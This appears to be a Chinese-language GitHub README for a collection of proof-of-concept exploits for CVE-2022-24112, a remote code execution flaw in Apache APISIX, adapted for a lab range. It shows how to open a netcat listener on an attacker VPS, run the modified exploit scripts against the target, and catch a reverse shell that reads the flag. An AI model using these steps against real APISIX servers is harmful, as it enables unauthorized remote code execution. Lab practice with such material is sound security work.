# POC
收集的POC
## CVE-2022-24112

为了做春秋云境:CVE-2022-24112靶场环境，修改了两个POC，将[M4xSec](https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112/blob/main/apisix-exploit.py)与[twseptian](https://github.com/twseptian/cve-2022-24112/blob/main/poc/poc2.py)两位师傅的POC稍作修改，适应春秋云境靶场：

---
**春秋云境:CVE-2022-24112：**

Apache Apisix是美国阿帕奇（Apache）基金会的一个云原生的微服务API网关服务。该软件基于 OpenResty 和 etcd 来实现，具备动态路由和插件热加载，适合微服务体系下的 API 管理。 Apache APISIX中存在远程代码执行漏洞，该漏洞源于产品的batch-requests插件未对用户的批处理请求进行有效限制。攻击者可通过该漏洞绕过Admin API的IP限制，容易导致远程代码执行。

---
原POC：

1、M4xSec：https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112/blob/main/apisix-exploit.py

2、twseptian：https://github.com/twseptian/cve-2022-24112/blob/main/poc/poc2.py

修改后的POC为我上面写的两个，分别针对Linux和Windows使用环境：

---

**CVE-2022-24112_Linux_by_twseptian.py**

1. VPS开启监听：`nc -lvvp 18888`
2. 进入POC目录运行：
   
   **注意**：此处添加-t的数据时，不需要写入`http://`或`https://`，只需要域名+端口即可，如下
   ```
   python3 CVE-2022-24112_Linux_by_twseptian.py -t eci-eninecsteC2zon6q0xod9n5r7me4ih.cloudeci1.ichunqiu.com:9080 -L VPS_IP -P VPS_PODRPODR
   ```
3. 返回查看VPS情况如下
   ```
   [root@root ~]# nc -lvvp 18888
   Ncat: Version 7.50 ( https://nmap.org/ncat )
   Ncat: Listening on :::18888
   Ncat: Listening on 0.0.0.0:18888
   Ncat: Connection from x.x.x.x.
   Ncat: Connection from x.x.x.x:x.
   id
   uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
   cat /flag
   flag{0834f79f-5f40-4389-bce7-c64e969734c4}
   ```

---

**CVE-2022-24112_Windows_by_M4xSec.py**

1. VPS开启监听：`nc -lvvp 18888`
2. 进入POC目录运行：
   
   **注意**：此处添加-t的数据时，不需要写入`http://`或`https://`，只需要域名+端口即可，如下
   ```
   python3 CVE-2022-24112_Windows_by_M4xSec.py eci-eninecsteC2zon6q0xod9n5r7me4ih.cloudeci1.ichunqiu.com:9080 VPS_IP VPS_PODRPODR
   ```
3. 返回查看VPS情况如下
   ```
   [root@root ~]# nc -lvvp 18888
   Ncat: Version 7.50 ( https://nmap.org/ncat )
   Ncat: Listening on :::18888
   Ncat: Listening on 0.0.0.0:18888
   Ncat: Connection from x.x.x.x.
   Ncat: Connection from x.x.x.x:x.
   id
   uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)
   cat /flag
   flag{0834f79f-5f40-4389-bce7-c64e969734c4}
   ```
